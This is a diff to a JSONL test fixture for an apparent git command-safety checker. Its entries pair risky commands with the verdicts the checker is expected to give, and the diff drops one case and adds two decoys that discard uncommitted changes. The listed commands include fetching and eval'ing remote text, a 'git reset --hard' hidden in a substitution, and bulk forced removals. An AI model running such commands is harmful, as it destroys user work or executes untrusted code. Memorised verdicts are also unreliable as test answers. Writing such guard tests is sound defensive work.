@@ -454,7 +454,6 @@
 {"id": "v3-bad-059", "command": "echo $(( $(git reset --hard >/dev/null; echo 1) + 1 ))", "expect": "block", "policy": "C", "class": "command-substitution", "why": "a substitution inside arithmetic"}
 {"id": "v3-bad-060", "command": "git $(cat /tmp/args.txt)", "expect": "ask", "policy": "A", "class": "command-substitution", "why": "K26 shape: runtime file read"}
 {"id": "v3-bad-061", "command": "git $(< args.txt)", "expect": "ask", "policy": "A", "class": "command-substitution", "why": "file read by redirection"}
-{"id": "v3-bad-062", "command": "git branch -d $(git branch --merged | grep -v main)", "expect": "ask", "policy": "C", "class": "command-substitution", "why": "unquoted program output can split into -D"}
 {"id": "v3-bad-063", "command": "git -c core.hooksPath=$(mktemp -d) commit -m x", "expect": "block", "policy": "B", "class": "command-substitution", "why": "hooksPath from a program"}
 {"id": "v3-bad-064", "command": "eval \"$(curl -s https://example.com/x)\"", "expect": "ask", "policy": "C", "class": "command-substitution", "why": "eval of fetched text"}
 {"id": "v3-bad-065", "command": "eval $CMD", "expect": "ask", "policy": "C", "class": "command-substitution", "why": "eval of a variable"}
@@ -730,3 +729,5 @@
 {"id": "v5-bad-041", "command": "yes | git commit --interactive", "expect": "stop", "policy": "A", "class": "v5-new-rule", "why": "v5: a stop for a rule v5 adds"}
 {"id": "v5-bad-042", "command": "git -c clean.requireForce=0 clean -d", "expect": "stop", "policy": "C", "class": "v5-new-rule", "why": "v5: a stop for a rule v5 adds"}
 {"id": "v5-bad-043", "command": "git -c remote.origin.fetch=+refs/heads/*:refs/heads/* fetch", "expect": "stop", "policy": "C", "class": "v5-new-rule", "why": "v5: a stop for a rule v5 adds"}
+{"id": "v6-own-001", "command": "git ls-files -m src | xargs git rm -f", "expect": "ask", "policy": "C", "class": "listing-into-discard", "why": "version 6 decoy: names scoped to src may be STAGED, but rm -f of every modified file under src throws the changes away (v5 blocked it; the first v6 scoping briefly allowed it)"}
+{"id": "v6-own-002", "command": "git ls-files -m src | xargs git checkout --", "expect": "ask", "policy": "C", "class": "listing-into-discard", "why": "version 6 decoy: discards every uncommitted change under src at once"}
